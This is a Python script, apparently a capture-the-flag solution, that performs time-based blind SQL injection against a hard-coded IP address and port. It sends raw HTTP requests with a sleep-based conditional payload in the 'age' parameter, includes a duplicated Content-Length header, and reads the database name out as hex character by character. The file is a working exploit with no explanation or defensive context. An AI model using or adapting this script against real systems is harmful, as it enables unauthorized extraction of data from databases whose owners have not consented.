import requests
import hackhttp 
import urllib
import socket

ip = '111.186.57.61'
port = 10601

def send_raw(raw):

    try:
        with socket.create_connection((ip, port), timeout=2) as conn:
            conn.send(bytes(raw,encoding="ascii"))
            res = conn.recv(10240).decode()

    except:
        return True
    
    return False



def rawhttp(sql):
    sql=urllib.parse.quote(sql)
    burp0_url = "http://111.186.57.61:10601/?age={}".format(sql)
    raw='''GET /?age={} HTTP/1.1
Host: 111.186.57.61:10601
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Length: 0
Content-Length: 0

'''.format(sql).replace("\n","\r\n")
    return send_raw(raw)


l='0123456789ABCDEF'
result=""
for j in range(10):
    for i in l:
        sql="if((select substr(hex(database()),{},1))=char({}),sleep(10),0)".format(j+1,ord(i))
        if rawhttp(sql):
            result+=i
            print(result)
            break
        else :
            print("第{}个字符不是{}".format(j+1,i))
        



